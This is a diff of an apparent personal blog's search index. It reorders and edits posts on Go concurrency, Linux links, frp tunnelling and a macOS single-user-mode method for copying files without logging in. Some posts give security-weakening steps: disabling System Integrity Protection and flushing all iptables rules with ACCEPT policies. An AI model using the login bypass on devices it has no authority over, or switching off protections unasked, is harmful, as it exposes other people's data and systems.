@@ -1493,62 +1940,15 @@ tag = urllib.parse.unquote(url)
       </tags>
   </entry>
   <entry>
-    <title>Use single-user-mode to access files from a mac without login</title>
-    <url>/articles/blogarchive/2019-05-26-18-23-29/</url>
-    <content><![CDATA[On May 23, 2019. I accidentally drop my MacBook, which looses the connection between the motherboard and hard drive. After I reconnect the SATA cable and restart my computer, I found that my laptop stuck after I enter the login password.
-##First try:In recovery mode, reset the password.
-See instruction at:
- https://www.macworld.co.uk/how-to/mac/forgotten-mac-password-3594395/ 
-or https://support.apple.com/en-hk/HT202860 
-or https://jingyan.baidu.com/article/6f2f55a163030bb5b83e6c71.html
-However, I failed.
-
-##Second try:I first try to set up a new user by using single user mode.
-See instruction here: https://zhidao.baidu.com/question/528962469.html
-However, after I set up the new user, I still got stuck when I try to login into the system.
-
-##My solutionSince I have a Time Machine backup in January, I can recover my computer using Time Machine. However, I still need to backup some important information that is not in the Time machine. After doing some research, I successfully copy the important file from MacBook using single user mode.
-###Copy file without login:
-If your mac running a macos higher than El Capitan, you should first remove “System Integrity Protection” before entering the single user mode. 
-
-Reboot your mac and press command + R, go to the recovery mode.
-
-Click on the &quot;Utilities&quot; menu, and then click on &quot;Terminal&quot; to open terminal.
-
-In the terminal type csrutil disable and enter.
-
-
-
-If your mac running a macos lower than El Capitain, ignore the step above.
-
-reboot again, but this time press command + S to enter single user mode.
-
-Follow the instruction, type /sbin/fsck -fy and press enter (if this command does not show “The volume xxx appears to be OK”, you should run this command multiple time until it shows this message)
-
-type mount -uw / and press enter
-
-type mkdir /Volumes/usb to create a directory for external storage device (using later). 
-
-type ls /dev/disk* to show current disks.
-
-plug in an external storage device (USB or other things), type ls /dev/disk* to find which is the external storage device (often the last one in the list).
-
-type fstyp /dev/disk1s3 (depends on which disk you are using) to find the system of the disk, (Interest things is that although my drive is exfat, the fstyp shows msdos).
-
-according to 7, type /sbin/mount_exfat /dev/disk1s3 /Volumes/usb to load storage device. Depending on your file system, you may choose a different command. For example, if your device is using msdos file system, you should type /sbin/mount_msdos instead of /sbin/mount_exfat. You can see all the supported file system by entering ls /sbin/mount_*
-
-if the external storage is loaded success, you can now access your external drive. Type ls /Volumes/usb to find out.
-
-Copy file to your device by using command cp. Eg: cp /User/xxx/Desktop/1.jpg /Volumes/usb
-
-
+    <title>New Best Toefl Score 2019 Aug</title>
+    <url>/articles/blogarchive/2019-09-04-08-30-23/</url>
+    <content><![CDATA[
 ]]></content>
       <categories>
-        <category>Programming</category>
+        <category>Life</category>
       </categories>
       <tags>
-        <tag>macos</tag>
-        <tag>tutorial</tag>
+        <tag>toefl</tag>
       </tags>
   </entry>
   <entry>
@@ -1578,8 +1978,8 @@ success~
         <category>Developing</category>
       </categories>
       <tags>
-        <tag>aliyun</tag>
         <tag>ssh</tag>
+        <tag>aliyun</tag>
         <tag>server</tag>
       </tags>
   </entry>
@@ -1653,28 +2053,6 @@ sudo service nginx restart.
       </tags>
   </entry>
   <entry>
-    <title>add cdn for live2d models</title>
-    <url>/articles/blogarchive/2019-09-16-22-32-00/</url>
-    <content><![CDATA[add cdn for live2d models
-now you can load live2d model faster.
-]]></content>
-      <categories>
-        <category>SiteDev</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>New Best Toefl Score 2019 Aug</title>
-    <url>/articles/blogarchive/2019-09-04-08-30-23/</url>
-    <content><![CDATA[
-]]></content>
-      <categories>
-        <category>Life</category>
-      </categories>
-      <tags>
-        <tag>toefl</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>utf-8 乱码表</title>
     <url>/articles/blogarchive/2019-09-06-10-34-25/</url>
     <content><![CDATA[
@@ -1684,35 +2062,14 @@ now you can load live2d model faster.
       </categories>
   </entry>
   <entry>
-    <title>Python input function not work properly in linux</title>
-    <url>/articles/blogarchive/2019-10-06-21-01-22/</url>
-    <content><![CDATA[When I am writing a backup program for my minecraft server using python.
-I find that when I want to use press backspace or arrow key, the input will not work properly.
-Instead, it shows strange character like.
-
-the solution is very simple
-add import readline at the begining of the code will automatically fix the problem
+    <title>add cdn for live2d models</title>
+    <url>/articles/blogarchive/2019-09-16-22-32-00/</url>
+    <content><![CDATA[add cdn for live2d models
+now you can load live2d model faster.
 ]]></content>
       <categories>
-        <category>Programming</category>
+        <category>SiteDev</category>
       </categories>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>change git password in idea</title>
-    <url>/articles/blogarchive/2019-10-26-21-00-50/</url>
-    <content><![CDATA[in terminal
-type
-git fetch
-]]></content>
-      <categories>
-        <category>Programming</category>
-      </categories>
-      <tags>
-        <tag>jetbrain</tag>
-      </tags>
   </entry>
   <entry>
     <title>【转载】iptables 详解</title>
@@ -1862,25 +2219,34 @@ iptables零基础快速入门系列
       </categories>
   </entry>
   <entry>
-    <title>Paradox Interactive games can&#39;t run on windows + Solution</title>
-    <url>/articles/blogarchive/2019-10-29-17-03-47/</url>
-    <content><![CDATA[IssueSome people may find that paradox games such as Heart of Iron will crash on windows 10.
-According to the steam page, paradox games often require directX 9.0c as the running time. 
-However, since windows 10 doesn&#39;t support directX anymore. And windows 10 pre-install with directX 11. The games can&#39;t run properly.
+    <title>Python input function not work properly in linux</title>
+    <url>/articles/blogarchive/2019-10-06-21-01-22/</url>
+    <content><![CDATA[When I am writing a backup program for my minecraft server using python.
+I find that when I want to use press backspace or arrow key, the input will not work properly.
+Instead, it shows strange character like.
 
-Solution
-go to https://blog.csdn.net/VBcom/article/details/9140197 and download the DirectX repair
-
-run the application and restart your computer.
-
-
+the solution is very simple
+add import readline at the begining of the code will automatically fix the problem
 ]]></content>
       <categories>
-        <category>系统默认</category>
+        <category>Programming</category>
       </categories>
       <tags>
-        <tag>solution</tag>
-        <tag>game</tag>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>change git password in idea</title>
+    <url>/articles/blogarchive/2019-10-26-21-00-50/</url>
+    <content><![CDATA[in terminal
+type
+git fetch
+]]></content>
+      <categories>
+        <category>Programming</category>
+      </categories>
+      <tags>
+        <tag>jetbrain</tag>
       </tags>
   </entry>
   <entry>
@@ -1981,6 +2347,28 @@ $ - 字符串必须由该正则匹配结束
       </tags>
   </entry>
   <entry>
+    <title>Paradox Interactive games can&#39;t run on windows + Solution</title>
+    <url>/articles/blogarchive/2019-10-29-17-03-47/</url>
+    <content><![CDATA[IssueSome people may find that paradox games such as Heart of Iron will crash on windows 10.
+According to the steam page, paradox games often require directX 9.0c as the running time. 
+However, since windows 10 doesn&#39;t support directX anymore. And windows 10 pre-install with directX 11. The games can&#39;t run properly.
+
+Solution
+go to https://blog.csdn.net/VBcom/article/details/9140197 and download the DirectX repair
+
+run the application and restart your computer.
+
+
+]]></content>
+      <categories>
+        <category>系统默认</category>
+      </categories>
+      <tags>
+        <tag>solution</tag>
+        <tag>game</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Docker Desktop setting won&#39;t open in windows 10</title>
     <url>/articles/coding/docker-desktop-setting-won-t-open-in-windows-10/</url>
     <content><![CDATA[If you stuck on the setting menu.
@@ -1992,8 +2380,8 @@ cd &quot;C:\Program Files\Docker\Docker&quot;
         <category>Coding</category>
       </categories>
       <tags>
-        <tag>windows</tag>
         <tag>docker</tag>
+        <tag>windows</tag>
       </tags>
   </entry>
   <entry>
@@ -2792,144 +3180,6 @@ My class note from UBC CPSC425
       </tags>
   </entry>
   <entry>
-    <title>用一个例子来简单介绍保证并发安全的几种方式</title>
-    <url>/articles/coding/explain-thread-safe-methods-using-example/</url>
-    <content><![CDATA[Introduction大家好，我是说的道理，今天来点大家想看的东西啊。
-
-
-问题介绍那么这边呢是我们的示例代码，在我自己做code review的时候我就发现了这边有很大概率会出现race condition的情况。但是我当时没管，因为我认为在我的应用场景下大概率碰不到这种情况。但是实际还是出现了，那么就来修复一下。
-// todo: make it thread safe, now it's not, photos might be overwritten
-func (s *srvImpl) AddPhotos(userID string, mealCreateAt time.Time, photo [][]byte) error &#123;
-    fileIds := make([]storage.FileID, 0, len(photo))
-    for _, p := range photo &#123;
-        fileId, err := s.storageApi.StoreAt("", "photo", p, storage.FileMeta&#123;
-            Prefix:   "",
-            Filename: "",
-            Length:   0,
-        &#125;)
-        if err != nil &#123;
-            s.log.ErrorW("store photo failed", "err", err, "userID", userID, "createAt", mealCreateAt)
-            return foodiary.ErrFailToGetMeal
-        &#125;
-        fileIds = append(fileIds, fileId)
-    &#125;
-    meal, err := s.repo.FindMeal(userID, mealCreateAt)
-    if err != nil &#123;
-        s.log.ErrorW("find meal failed", "err", err, "userID", userID, "createAt", mealCreateAt)
-        return foodiary.ErrMealNotFound
-    &#125;
-    meal.Photos = append(meal.Photos, fileIds...)
-    err = s.repo.Upsert(meal)
-    if err != nil &#123;
-        s.log.ErrorW("upsert meal failed", "err", err, "userID", userID, "createAt", mealCreateAt)
-        return foodiary.ErrFailModifyMeal
-    &#125;
-    return nil
-&#125;
-
-问题分析先不提repo层的设计问题，单纯来看如何解决并发问题。实际上，问题出现在FindMeal和Upsert之间，如果两个线程同时执行这个函数，一个线程往Meal中添加图片A，另一个线程往同一个Meal里添加图片B，那么就很有可能出现只有图片A被添加，或者只有图片B被添加的情况。
-
-所以要解决这个问题，就是要保证一个线程在FindMeal到Upsert这段完成之间，没有其他线程能够修改这个Meal。
-那么要实现这些功能，我们可以从如下几个方向思考：
-
-锁 (Locking)
-事务 (Transaction)
-队列 (Queue)
-
-锁 Locking锁大致可以分为乐观锁和悲观锁，在这里我们会分别介绍
-悲观锁这个就是最常见的锁的概念，假设一定会发生冲突，所以在操作一个资源的时候，停止一切其他线程对这个资源的操作。
-至于这个锁要怎么实现，那就取决与你自己的选择了。比如，如果你的资源需要在好多个服务间或者分布式系统中使用，那么可以使用类似redis的方式来实现分布式锁，这种方式可以在分布式环境下有效保证资源的一致性。如果只是单个应用，那么可以直接使用应用内存锁，例如使用sync.Mutex，来控制同一时刻只有一个线程能访问资源。
-优缺点：
-
-**优点：**适用于高冲突场景，确保数据的一致性和正确性。任何时候只有一个线程可以操作资源，避免了并发修改导致的数据不一致问题。
-**缺点：**会阻塞其他线程的访问，可能会导致性能下降，尤其是在资源锁定时间长的情况下，降低系统的并发性。
-
-lockKey := fmt.Sprintf("meal_lock:%s:%d", userID, mealCreateAt.Unix())
-lock, err := redisClient.Lock(lockKey, 5*time.Second)
-if err != nil &#123;
-    return err
-&#125;
-defer lock.Unlock()
-
-meal, err := s.repo.FindMeal(userID, mealCreateAt)
-if err != nil &#123;
-    return foodiary.ErrMealNotFound
-&#125;
-meal.Photos = append(meal.Photos, fileIds...)
-err = s.repo.Upsert(meal)
-if err != nil &#123;
-    return foodiary.ErrFailModifyMeal
-&#125;
-
-乐观锁简单来说就是假设每次拿数据的时候都认为没有其他线程会对同一个资源进行修改，所以不对该操作进行上锁。但是如果要修改资源，则先提交资源修改的请求，再确认这个资源是否被修改过了。如果没有被修改过，那就很好。如果被修改过了，那么就放弃本次操作，或者重新获取资源，并重试本次操作直到成功。
-一般来说，实现乐观锁可以通过添加一个独立的可比较的字段实现，比如版本号、时间戳等。
-比如使用版本号，可以在每次对数据进行更新的时候对版本号+1，在更新的时候判断这条数据是否还是原来的版本号，如果是的就更新，如果不是，就是有另外一个线程修改了这个资源。
-优缺点：
-
-优点：不需要持有锁，性能好，适用于低并发场景。
-缺点：如果冲突频繁，会导致不断重试，降低性能。
-
-比如，我们可以通过如下代码实现乐观锁，当出现foodiary.ErrConflict的时候，对该操作进行重试。
-meal, err := s.repo.FindMeal(userID, mealCreateAt)
-if err != nil &#123;
-    return foodiary.ErrMealNotFound
-&#125;
-
-originalVersion := meal.Version
-meal.Photos = append(meal.Photos, newFileIds...)
-meal.Version++
-
-err = s.repo.UpsertWithVersion(meal, originalVersion)
-if err != nil &#123;
-    if err == foodiary.ErrVersionConflict &#123;
-        s.log.ErrorW("conflict detected while updating meal", "userID", userID, "createAt", mealCreateAt)
-        return foodiary.ErrConflict
-    &#125;
-    return foodiary.ErrFailModifyMeal
-&#125;
-
-事务 (Transaction)事务是数据库管理中的概念，通常用来保证一组操作要么全部成功，要么全部失败回滚。事务在保证数据一致性方面非常有用，尤其是在多个操作需要原子性的时候。
-例如，在处理Meal时，如果我们需要同时更新Meal的多个字段（如添加照片和更新描述），使用事务可以确保这些操作要么全部成功，要么全部失败，以保持数据的一致性。
-但是在我们的场景中，事务并不完全适用。因为我们的问题是多个线程在同时尝试修改同一个Meal，而事务的作用是在单次操作中保证原子性，并不能防止多个线程竞争修改同一条数据。因此，单纯使用事务并不能彻底解决并发冲突的问题。
-队列 (Queue)另一种常见的解决并发修改问题的方法是使用队列。我们可以将每个对Meal的修改请求都放入一个队列中，确保所有的修改操作是按顺序执行的。
-在Go语言中，我们可以使用chan来实现一个简单的队列。例如：
-type mealUpdateTask struct &#123;
-    userID      string
-    mealCreateAt time.Time
-    photos       [][]byte
-    errChan      chan error
-&#125;
-
-tasksChan := make(chan mealUpdateTask)
-
-func (s *srvImpl) processTasks() &#123;
-    for task := range tasksChan &#123;
-        err := s.addPhotosInternal(task.userID, task.mealCreateAt, task.photos)
-        task.errChan &lt;- err
-    &#125;
-&#125;
-
-func (s *srvImpl) AddPhotos(userID string, mealCreateAt time.Time, photos [][]byte) error &#123;
-    errChan := make(chan error)
-    tasksChan &lt;- mealUpdateTask&#123;userID, mealCreateAt, photos, errChan&#125;
-    return &lt;-errChan
-&#125;
-
-这种方式通过一个单独的处理线程来串行化所有的对Meal的修改操作，确保不会有并发问题。当然，对于复杂的生产环境，我们可以引入消息队列系统，例如RabbitMQ、Kafka等，用来处理更多的请求和提高可靠性。
-优缺点：
-
-优点：保证操作顺序，避免并发问题。
-缺点：可能会带来延迟，队列的处理速度可能成为瓶颈。
-
-]]></content>
-      <categories>
-        <category>Coding</category>
-      </categories>
-      <tags>
-        <tag>golang</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>C++ object lifecyle adventure</title>
     <url>/articles/coding/cpp-lifecycle-intro/</url>
     <content><![CDATA[IntroductionProgrammer: Huh. I wonder where are my objects?
@@ -3351,6 +3601,144 @@ void operator delete(void * mem) &#123;
       </tags>
   </entry>
   <entry>
+    <title>用一个例子来简单介绍保证并发安全的几种方式</title>
+    <url>/articles/coding/explain-thread-safe-methods-using-example/</url>
+    <content><![CDATA[Introduction大家好，我是说的道理，今天来点大家想看的东西啊。
+
+
+问题介绍那么这边呢是我们的示例代码，在我自己做code review的时候我就发现了这边有很大概率会出现race condition的情况。但是我当时没管，因为我认为在我的应用场景下大概率碰不到这种情况。但是实际还是出现了，那么就来修复一下。
+// todo: make it thread safe, now it's not, photos might be overwritten
+func (s *srvImpl) AddPhotos(userID string, mealCreateAt time.Time, photo [][]byte) error &#123;
+    fileIds := make([]storage.FileID, 0, len(photo))
+    for _, p := range photo &#123;
+        fileId, err := s.storageApi.StoreAt("", "photo", p, storage.FileMeta&#123;
+            Prefix:   "",
+            Filename: "",
+            Length:   0,
+        &#125;)
+        if err != nil &#123;
+            s.log.ErrorW("store photo failed", "err", err, "userID", userID, "createAt", mealCreateAt)
+            return foodiary.ErrFailToGetMeal
+        &#125;
+        fileIds = append(fileIds, fileId)
+    &#125;
+    meal, err := s.repo.FindMeal(userID, mealCreateAt)
+    if err != nil &#123;
+        s.log.ErrorW("find meal failed", "err", err, "userID", userID, "createAt", mealCreateAt)
+        return foodiary.ErrMealNotFound
+    &#125;
+    meal.Photos = append(meal.Photos, fileIds...)
+    err = s.repo.Upsert(meal)
+    if err != nil &#123;
+        s.log.ErrorW("upsert meal failed", "err", err, "userID", userID, "createAt", mealCreateAt)
+        return foodiary.ErrFailModifyMeal
+    &#125;
+    return nil
+&#125;
+
+问题分析先不提repo层的设计问题，单纯来看如何解决并发问题。实际上，问题出现在FindMeal和Upsert之间，如果两个线程同时执行这个函数，一个线程往Meal中添加图片A，另一个线程往同一个Meal里添加图片B，那么就很有可能出现只有图片A被添加，或者只有图片B被添加的情况。
+
+所以要解决这个问题，就是要保证一个线程在FindMeal到Upsert这段完成之间，没有其他线程能够修改这个Meal。
+那么要实现这些功能，我们可以从如下几个方向思考：
+
+锁 (Locking)
+事务 (Transaction)
+队列 (Queue)
+
+锁 Locking锁大致可以分为乐观锁和悲观锁，在这里我们会分别介绍
+悲观锁这个就是最常见的锁的概念，假设一定会发生冲突，所以在操作一个资源的时候，停止一切其他线程对这个资源的操作。
+至于这个锁要怎么实现，那就取决与你自己的选择了。比如，如果你的资源需要在好多个服务间或者分布式系统中使用，那么可以使用类似redis的方式来实现分布式锁，这种方式可以在分布式环境下有效保证资源的一致性。如果只是单个应用，那么可以直接使用应用内存锁，例如使用sync.Mutex，来控制同一时刻只有一个线程能访问资源。
+优缺点：
+
+**优点：**适用于高冲突场景，确保数据的一致性和正确性。任何时候只有一个线程可以操作资源，避免了并发修改导致的数据不一致问题。
+**缺点：**会阻塞其他线程的访问，可能会导致性能下降，尤其是在资源锁定时间长的情况下，降低系统的并发性。
+
+lockKey := fmt.Sprintf("meal_lock:%s:%d", userID, mealCreateAt.Unix())
+lock, err := redisClient.Lock(lockKey, 5*time.Second)
+if err != nil &#123;
+    return err
+&#125;
+defer lock.Unlock()
+
+meal, err := s.repo.FindMeal(userID, mealCreateAt)
+if err != nil &#123;
+    return foodiary.ErrMealNotFound
+&#125;
+meal.Photos = append(meal.Photos, fileIds...)
+err = s.repo.Upsert(meal)
+if err != nil &#123;
+    return foodiary.ErrFailModifyMeal
+&#125;
+
+乐观锁简单来说就是假设每次拿数据的时候都认为没有其他线程会对同一个资源进行修改，所以不对该操作进行上锁。但是如果要修改资源，则先提交资源修改的请求，再确认这个资源是否被修改过了。如果没有被修改过，那就很好。如果被修改过了，那么就放弃本次操作，或者重新获取资源，并重试本次操作直到成功。
+一般来说，实现乐观锁可以通过添加一个独立的可比较的字段实现，比如版本号、时间戳等。
+比如使用版本号，可以在每次对数据进行更新的时候对版本号+1，在更新的时候判断这条数据是否还是原来的版本号，如果是的就更新，如果不是，就是有另外一个线程修改了这个资源。
+优缺点：
+
+优点：不需要持有锁，性能好，适用于低并发场景。
+缺点：如果冲突频繁，会导致不断重试，降低性能。
+
+比如，我们可以通过如下代码实现乐观锁，当出现foodiary.ErrConflict的时候，对该操作进行重试。
+meal, err := s.repo.FindMeal(userID, mealCreateAt)
+if err != nil &#123;
+    return foodiary.ErrMealNotFound
+&#125;
+
+originalVersion := meal.Version
+meal.Photos = append(meal.Photos, newFileIds...)
+meal.Version++
+
+err = s.repo.UpsertWithVersion(meal, originalVersion)
+if err != nil &#123;
+    if err == foodiary.ErrVersionConflict &#123;
+        s.log.ErrorW("conflict detected while updating meal", "userID", userID, "createAt", mealCreateAt)
+        return foodiary.ErrConflict
+    &#125;
+    return foodiary.ErrFailModifyMeal
+&#125;
+
+事务 (Transaction)事务是数据库管理中的概念，通常用来保证一组操作要么全部成功，要么全部失败回滚。事务在保证数据一致性方面非常有用，尤其是在多个操作需要原子性的时候。
+例如，在处理Meal时，如果我们需要同时更新Meal的多个字段（如添加照片和更新描述），使用事务可以确保这些操作要么全部成功，要么全部失败，以保持数据的一致性。
+但是在我们的场景中，事务并不完全适用。因为我们的问题是多个线程在同时尝试修改同一个Meal，而事务的作用是在单次操作中保证原子性，并不能防止多个线程竞争修改同一条数据。因此，单纯使用事务并不能彻底解决并发冲突的问题。
+队列 (Queue)另一种常见的解决并发修改问题的方法是使用队列。我们可以将每个对Meal的修改请求都放入一个队列中，确保所有的修改操作是按顺序执行的。
+在Go语言中，我们可以使用chan来实现一个简单的队列。例如：
+type mealUpdateTask struct &#123;
+    userID      string
+    mealCreateAt time.Time
+    photos       [][]byte
+    errChan      chan error
+&#125;
+
+tasksChan := make(chan mealUpdateTask)
+
+func (s *srvImpl) processTasks() &#123;
+    for task := range tasksChan &#123;
+        err := s.addPhotosInternal(task.userID, task.mealCreateAt, task.photos)
+        task.errChan &lt;- err
+    &#125;
+&#125;
+
+func (s *srvImpl) AddPhotos(userID string, mealCreateAt time.Time, photos [][]byte) error &#123;
+    errChan := make(chan error)
+    tasksChan &lt;- mealUpdateTask&#123;userID, mealCreateAt, photos, errChan&#125;
+    return &lt;-errChan
+&#125;
+
+这种方式通过一个单独的处理线程来串行化所有的对Meal的修改操作，确保不会有并发问题。当然，对于复杂的生产环境，我们可以引入消息队列系统，例如RabbitMQ、Kafka等，用来处理更多的请求和提高可靠性。
+优缺点：
+
+优点：保证操作顺序，避免并发问题。
+缺点：可能会带来延迟，队列的处理速度可能成为瓶颈。
+
+]]></content>
+      <categories>
+        <category>Coding</category>
+      </categories>
+      <tags>
+        <tag>golang</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>如何在go embed中包含有下划线(_)的文件 + Gin SPA</title>
     <url>/articles/coding/go-embed-with-underscore/</url>
     <content><![CDATA[tl;dr使用 all标题来解决问题。
@@ -3568,6 +3956,30 @@ Lesson LearnedNever use your own application in real shit
       </tags>
   </entry>
   <entry>
+    <title>Linux中软链接(soft link)和硬链接(hard link)的区别</title>
+    <url>/articles/coding/linux-hard-link-vs-soft-link/</url>
+    <content><![CDATA[简介linux中, 有一个和windows快捷方式相似的功能，叫做链接 (Links). 在linux中, 创建链接可以使用命令ln. 
+但是ln可以创建两张链接, 一种是软链接 (soft link), 一种是硬链接(hard link)
+软链接可以用 ln -s src dest 来创建
+硬链接可以用 ln src dest 来创建
+区别区别是啥呐? 
+首先linux中每个文件都有一个指定的Inode。 这个Inode就像是数据库中的一条数据。每个Inode都有一个自己指定的编号。
+比如我们有一个文件 A(Inode # 1)。
+软链接假如我们使用软链接创建一个文件B，那么这个文件B会有自己的一个Inode -&gt; B (Inode #2) 。 在这种情况下，文件B相当于一个快捷方式，指向了文件A的地址。
+这种情况下，假如我们删除了文件A，那么文件B就指向一个不存在的地址，就相当于失效了。
+硬链接如果用硬链接，就不一样了。硬链接不是指向文件的地址，而是直接指向了文件的Inode。
+比如用硬链接创建文件A的链接C，那么文件C会有和A一样的Inode ID -&gt; C (Inode #1)。
+这种情况下，假如我们删除了文件A，文件C依然指向文件本身，所以链接C依旧可用。
+可以把C看作是A的拷贝，但是他们指向的文件内容其实是一样的
+]]></content>
+      <categories>
+        <category>Coding</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Piping In Linux</title>
     <url>/articles/coding/linux-piping/</url>
     <content><![CDATA[Linux piping in summary
@@ -3603,30 +4015,6 @@ redirect standard out to a file, adding to the end of tis current contents
 redirect both standard out and standard error to a file, adding to the end of its current contents
 
 
-]]></content>
-      <categories>
-        <category>Coding</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux中软链接(soft link)和硬链接(hard link)的区别</title>
-    <url>/articles/coding/linux-hard-link-vs-soft-link/</url>
-    <content><![CDATA[简介linux中, 有一个和windows快捷方式相似的功能，叫做链接 (Links). 在linux中, 创建链接可以使用命令ln. 
-但是ln可以创建两张链接, 一种是软链接 (soft link), 一种是硬链接(hard link)
-软链接可以用 ln -s src dest 来创建
-硬链接可以用 ln src dest 来创建
-区别区别是啥呐? 
-首先linux中每个文件都有一个指定的Inode。 这个Inode就像是数据库中的一条数据。每个Inode都有一个自己指定的编号。
-比如我们有一个文件 A(Inode # 1)。
-软链接假如我们使用软链接创建一个文件B，那么这个文件B会有自己的一个Inode -&gt; B (Inode #2) 。 在这种情况下，文件B相当于一个快捷方式，指向了文件A的地址。
-这种情况下，假如我们删除了文件A，那么文件B就指向一个不存在的地址，就相当于失效了。
-硬链接如果用硬链接，就不一样了。硬链接不是指向文件的地址，而是直接指向了文件的Inode。
-比如用硬链接创建文件A的链接C，那么文件C会有和A一样的Inode ID -&gt; C (Inode #1)。
-这种情况下，假如我们删除了文件A，文件C依然指向文件本身，所以链接C依旧可用。
-可以把C看作是A的拷贝，但是他们指向的文件内容其实是一样的
 ]]></content>
       <categories>
         <category>Coding</category>
@@ -3945,7 +4333,7 @@ grid[j][j] == False # False即表示该格子中的称述为假，不能打勾
 然后前面提到，每个格子的真假又依赖其他格子的打勾状态，也就是依赖其他格子的真假状态。诶，这不正好就是一个逻辑公式么。
 grid[i][j] &#x3D;&#x3D; (grid[x][y] and grid[x+1][y+1] ........)
 
-于是这个问题就变成了：“就变成了是否存在一个5x5的布尔变量矩阵，使所有的条件成立。” 而这样我们就满足了题目要求的第一条和第二条要求。
+于是这个问题就变成了：“是否存在一个5x5的布尔变量矩阵，使所有的条件成立。” 而这样我们就满足了题目要求的第一条和第二条要求。
 如果再加上bingo的条件，也就是
 
 存在一整行都被打勾
@@ -4585,138 +4973,6 @@ func main() &#123;
       </tags>
   </entry>
   <entry>
-    <title>利用frp进行内网穿透，从外网访问内部服务器 (使用Oracle VM)</title>
-    <url>/articles/devops/intranet-penetration-with-frp-and-oracle-vms/</url>
-    <content><![CDATA[前言 &amp; 简要介绍我为什么突然要搞一个内网穿透呢，因为oracle有一个免费的机器，放着也没用，不如整一个frp做内网穿透好了。
-什么是内网穿透，简单来说就是你家里有一个服务器，开放了一些服务想要给外面的人用。但是你没有公网ip，所以外面访问不了。
-这个时候，就需要内网穿透。通过一个有公网地址的服务器，把流量转发过来。
-接下来就是我如何配置内网穿透的过程了。
-
-
-我的配置首先你得有一个具有公网ip的服务器，一个域名(如果你没有http的流量需要转发的话就不需要)。公网的服务器用来安装frp的服务器端，一个域名用来对不同的web服务进行转发。
-frp的代码开源在githubfrp，文档在文档。最基本的安装教程以及配置都可以在这两个链接中找到。
-服务器设置（服务端）安装&amp;配置 frps首先在Github的Release页面中下载对应操作系统架构的可执行文件，然后解压
-wget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.44.0&#x2F;frp_0.44.0_linux_amd64.tar.gz
-
-tar -zxvf frp_0.44.0_linux_amd64.tar.gz
-
-打开fprs.ini，记住是fprs.ini
-修改内容为
-[common]
-bind_port &#x3D; 7000 # 这个是服务器的端口
-token&#x3D;your_token # 改成你自己的token，随便取
-
-dashboard_port &#x3D; 7500 # 这个是管理界面的端口
-dashboard_user &#x3D; aynakeya # 这个是管理界面的账号
-dashboard_pwd &#x3D; your_password # 这个是管理界面的密码
-enable_prometheus &#x3D; true # 这个是开始管理界面
-
-subdomain_host &#x3D; aa.xxxx.com # 这个是http服务的自定义二级域名
-vhost_http_port &#x3D; 80 # 这个是http服务的端口，如果不需要转发http就不用写
-
-关于自定义二级域名的跟多信息可以看自定义二级域名
-将frps注册为系统服务并启动创建frps.service文件
-在/etc/systemd/system/frps.service中填上
-[Unit]
-# 服务名称，可自定义
-Description &#x3D; frp server
-After &#x3D; network.target syslog.target
-Wants &#x3D; network.target
-
-[Service]
-Type &#x3D; simple
-# 启动frps的命令，需修改为frps的安装路径
-ExecStart &#x3D; &#x2F;home&#x2F;ubuntu&#x2F;repo&#x2F;frp&#x2F;frps -c &#x2F;home&#x2F;ubuntu&#x2F;repo&#x2F;frp&#x2F;frps.ini
-
-[Install]
-WantedBy &#x3D; multi-user.target
-
-然后启动并查看服务状态
-sudo systemctl start frps.service
-sudo systemctl status frps.service
-
-打开允许程序通过服务器防火墙这里以Oracle VM作为例子
-打开Oracle VM Ubuntu系统instance的防火墙 reference
-sudo iptables -P INPUT ACCEPT
-sudo iptables -P OUTPUT ACCEPT
-sudo iptables -P FORWARD ACCEPT
-sudo iptables -F
-
-找到Instance -&gt; subnet -&gt; security list -&gt; 选一个security list
-在security list中添加规则 Ingress Rule，把管理端口，程序端口，以及你要映射的端口都加上
-
-客户端设置 frpc安装&amp;配置 frpc同样在Github的Release页面中下载对应操作系统架构的可执行文件，然后解压
-wget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.44.0&#x2F;frp_0.44.0_linux_amd64.tar.gz
-
-tar -zxvf frp_0.44.0_linux_amd64.tar.gz
-
-打开fprc.ini，这次是fprc.ini
-填入如下内容，更多功能可以参考frp功能
-[common]
-server_addr &#x3D;  x.x.x.x # 服务器的地址
-server_port &#x3D; 7000
-token&#x3D;your_token  # 在服务器设置里填的token
-
-[frontpage]
-type &#x3D; http 
-local_ip &#x3D; 127.0.0.1 # 本地的地址
-local_port &#x3D; 80 # 本地的端口
-custom_domains &#x3D; aa.xxxx.com # 用aa.xxxx.com访问
-
-[calibre]
-type &#x3D; http
-local_ip &#x3D; 127.0.0.1
-local_port &#x3D; 8020
-# 用calibre.&lt;subdomain_host&gt; 也就是 用calibre.aa.xxxx.com
-subdomain &#x3D; calibre 
-
-[jellyfin]
-type &#x3D; http
-local_ip &#x3D; 127.0.0.1
-local_port &#x3D; 8030
-subdomain &#x3D; jellyfin
-
-[aria2web]
-type &#x3D; http
-local_ip &#x3D; 127.0.0.1
-local_port &#x3D; 6801
-subdomain &#x3D; aria2web
-
-将frpc注册为系统服务并启动创建frpc.service文件
-在/etc/systemd/user/frps.service中填上
-[Unit]
-Description &#x3D; frp client
-After &#x3D; network.target syslog.target
-Wants &#x3D; network.target
-
-[Service]
-Type &#x3D; simple
-ExecStart &#x3D; &#x2F;home&#x2F;aynakeya&#x2F;repo&#x2F;frp&#x2F;frpc -c &#x2F;home&#x2F;aynakeya&#x2F;repo&#x2F;frp&#x2F;frpc.ini
-
-[Install]
-WantedBy &#x3D; multi-user.target
-
-启动并检查
-systemctl --user start frpc.service
-systemctl --user status frpc.service
-
-域名设置打开dns记录，添加上两个记录，一个是次级域名的解析，一个是次级域名的次级域名的解析.
-比如在这里就是aa.xxxx.com和*.aa.xxxx.com
-
-完成然后你就可以从外网访问你的内部服务器啦
-效果展示这个就不放了，效果和内网访问一样的。
